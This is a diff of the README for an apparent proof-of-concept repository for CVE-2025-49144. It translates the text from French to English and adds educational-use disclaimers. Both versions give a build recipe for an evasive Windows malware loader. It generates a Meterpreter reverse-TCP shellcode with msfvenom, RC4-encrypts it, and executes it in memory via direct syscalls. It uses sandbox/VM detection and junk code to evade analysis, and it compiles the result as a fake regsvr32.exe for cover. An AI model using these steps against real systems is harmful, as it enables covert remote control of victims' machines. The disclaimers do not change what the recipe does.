@@ -1,128 +1,89 @@
-# 🔓 CVE-2025-49144
+# CVE-2025-49144 — Educational PoC (`regsvr32` LOLBIN)
 
-Ce projet propose un PoC exploitant **CVE-2025-49144** via un détournement local de `regsvr32.exe` (LOLBIN hijacking), pour exécuter du shellcode Meterpreter chiffré avec **RC4** et injecté en mémoire via des **appels système directs** grâce à [SysWhispers3](https://github.com/klezVirus/SysWhispers3).
+> **Educational / authorized testing only.**  
+> This repository is a research PoC for understanding a local `regsvr32.exe` hijacking path (LOLBIN).  
+> Use only on systems you own or have **explicit written authorization** to test.  
+> Unauthorized use is illegal. The author assumes no liability for misuse.
 
 ---
 
-## 📦 Prérequis
+## Context
+
+PoC exploring **CVE-2025-49144** via local diversion of `regsvr32.exe`, with encrypted shellcode handled in memory and direct syscalls generated via [SysWhispers3](https://github.com/klezVirus/SysWhispers3).
+
+Goal: document techniques for **blue-team awareness**, detection engineering, and controlled lab study — not production offensive tooling.
+
+---
+
+## Scope & ethics
+
+| Allowed | Not allowed |
+|--------|-------------|
+| Your own lab / VMs | Third-party systems without consent |
+| Authorized pentest / coursework | Distribution as malware |
+| Defensive research & detection | Circumventing security controls in the wild |
+
+If you are unsure whether your use case is authorized: **do not run this**.
+
+---
+
+## Prerequisites
 
 - Python 3.x
 - `msfvenom` (Metasploit Framework)
 - MinGW-w64 (`x86_64-w64-mingw32-gcc`)
-- Windows (environnement de test)
+- Isolated Windows **lab** environment
 
 ---
 
-## 💡 Fonctionnalités
+## High-level flow
 
-- Chiffrement/déchiffrement RC4 (clé en dur)
-- Appels système directs pour l’allocation, la protection et la terminaison
-- Détection environnement sandbox/VM (optionnelle)
-- Aucune écriture de payload sur disque (exécution full in-memory)
-- Camouflage via exécution légitime de `regsvr32.exe`
+1. Prepare shellcode for a controlled lab listener  
+2. Format & RC4-encrypt it into a C header  
+3. Build a loader that decrypts/executes in memory and launches legitimate `regsvr32.exe` as cover  
 
----
-
-## ⚙️ Étapes de génération
-
-### 1. Générer le shellcode
+### Lab generation (authorized environments only)
 
 ```bash
+# 1) Shellcode (replace LHOST/LPORT with your lab values)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c -o shellcode.txt
-```
 
-### 2. Formater le shellcode pour Python
-
-```bash
+# 2) Format for Python
 python3 format_shellcode_txt.py
-```
+# Copy output into rc4_shellcode.py
 
-📌 Copier le résultat dans `rc4_shellcode.py`.
-
-### 3. Générer le header C
-
-```bash
+# 3) Generate encrypted_payload.h
 python3 rc4_shellcode.py
-```
 
-👉 Cela produit `encrypted_payload.h`.
-
-### 4. Compiler le loader
-
-```bash
+# 4) Compile loader
 x86_64-w64-mingw32-gcc loader.c syscalls.c syscalls.obj -o regsvr32.exe -mwindows -s -O2
 ```
 
 ---
 
-## 📁 Composants
+## Repository layout
 
-- `format_shellcode_txt.py` : Nettoie et reformate le shellcode brut
-- `rc4_shellcode.py` : Chiffre le shellcode + génère `encrypted_payload.h`
-- `loader.c` : Déchiffre, injecte et exécute le shellcode en mémoire
-- `syscalls.*` : Appels noyau générés via SysWhispers3
-
----
-
-## 🔍 Détails du Code (`loader.c`)
-
-### `rc4()`
-
-```c
-void rc4(unsigned char *data, unsigned int len, const unsigned char *key, unsigned int keylen)
-```
-
-Implémente RC4 : S-box, KSA, PRGA et XOR à la volée.
+| File | Role |
+|------|------|
+| `format_shellcode_txt.py` | Formats raw shellcode for the encryptor |
+| `rc4_shellcode.py` | RC4 encrypt + emits `encrypted_payload.h` |
+| `loader.c` | In-memory decrypt / execute orchestration |
+| `syscalls.*` | Direct syscalls (SysWhispers3) |
+| `encrypted_payload.h` | Generated encrypted payload header |
 
 ---
 
-### `junk()`
+## Loader notes (`loader.c`)
 
-Fonction inutile mais présente pour casser les empreintes binaires :
-
-```c
-if (rand() % 123 == 42) MessageBoxA(...);
-```
-
----
-
-### `is_sandbox_environment()`
-
-Détecte :
-- RAM < 2 Go
-- CPU < 2
-- Inactivité > 5 min
-- Uptime < 30 sec
-- Présence de chaînes VMware, VirtualBox, QEMU, etc.
+- **`rc4()`** — in-memory RC4 decrypt  
+- **`junk()`** — trivial fingerprint noise  
+- **`is_sandbox_environment()`** — optional sandbox/VM heuristics (RAM, CPU, uptime, common hypervisor strings)  
+- **`WinMain()`** — allocate → decrypt → protect → execute → spawn real `regsvr32.exe` → exit via syscall  
 
 ---
 
-### `WinMain()`
+## License
 
-1. **Initialise** le contexte (random, junk)
-2. **Optionnel** : vérifie environnement sandbox
-3. **Alloue** de la mémoire (syscall)
-4. **Déchiffre** le shellcode (RC4)
-5. **Protège** la mémoire (RX)
-6. **Exécute** le shellcode
-7. **Lance** le vrai `regsvr32.exe` pour masquer l’action
-8. **Termine** le processus (syscall)
+MIT — see [LICENSE](./LICENSE).
 
----
-
-## ✅ Résumé des rôles
-
-| Fonction               | Rôle                                                              |
-|------------------------|-------------------------------------------------------------------|
-| `rc4()`                | Déchiffrement du payload RC4 en mémoire                           |
-| `junk()`               | Perturbation d’empreinte binaire                                  |
-| `is_sandbox_environment()` | Bypass VM/sandbox si activé                                     |
-| `WinMain()`            | Orchestration complète de l'exécution                             |
-
----
-
-## ⚠️ Avertissement
-
-> 🚨 **À des fins éducatives uniquement.**  
-> Toute utilisation sans autorisation explicite constitue une violation de la loi.  
-> L’auteur décline toute responsabilité en cas de détournement.
+Research use does **not** grant permission to attack systems without authorization.
